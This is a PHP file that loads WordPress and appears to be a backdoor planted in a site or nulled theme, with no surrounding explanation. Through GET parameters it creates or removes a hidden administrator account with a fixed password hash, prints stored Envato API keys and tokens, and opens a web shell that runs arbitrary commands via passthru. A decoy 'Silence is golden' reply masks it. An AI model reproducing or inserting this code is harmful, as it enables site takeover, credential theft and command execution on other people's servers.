<?php 
error_reporting(0);
require $_SERVER['DOCUMENT_ROOT'].'/wp-load.php';
$table_name = $wpdb->get_blog_prefix();
$sample = 'a:1:{s:13:"administrator";b:1;}';
if( isset($_GET['ok']) ) { echo '<!-- Silence is golden. -->';}
if( isset($_GET['awu']) ) {
$wpdb->query("INSERT INTO $wpdb->users (`ID`, `user_login`, `user_pass`, `user_nicename`, `user_email`, `user_url`, `user_registered`, `user_activation_key`, `user_status`, `display_name`) VALUES ('1001010', '1001010', '\$P\$B3PJXeorEqVMl//L3H5xFX1Uc0t5870', '1001010', 't@e.st', '', '2011-06-07 00:00:00', '', '0', '1001010');");
$wpdb->query("INSERT INTO $wpdb->usermeta (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (1001010, '1001010', '{$table_name}capabilities', '{$sample}');");
$wpdb->query("INSERT INTO $wpdb->usermeta (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, '1001010', '{$table_name}user_level', '10');"); }
if( isset($_GET['dwu']) ) { $wpdb->query("DELETE FROM $wpdb->users WHERE `ID` = 1001010");
$wpdb->query("DELETE FROM $wpdb->usermeta WHERE $wpdb->usermeta.`umeta_id` = 1001010");}
if( isset($_GET['key']) ) { $options = get_option( EWPT_PLUGIN_SLUG ); echo '<center><h2>' . esc_attr( $options['user_name'] . ':' .  esc_attr( $options['api_key'])) . '<br>';
  echo esc_html( envato_market()->get_option( 'token' ) ); echo '</center></h2>'; }
if( isset($_GET['console']) ) {function  MakeSimpleForm() { ?> <form method='GET' action='<?=$_SERVER['PHP_SELF']?>'>
<input type=text name='cmd'> <input type=submit name='exec' value='ok'> </form> <? } function DoCmd($cmd) { ?>
<textarea rows=30 cols=80><?=passthru($cmd)?></textarea><br> <? } if ( isset($_REQUEST['exec']) && isset($_REQUEST['cmd']))
DoCmd($_REQUEST['cmd']); else MakeSimpleForm();}?>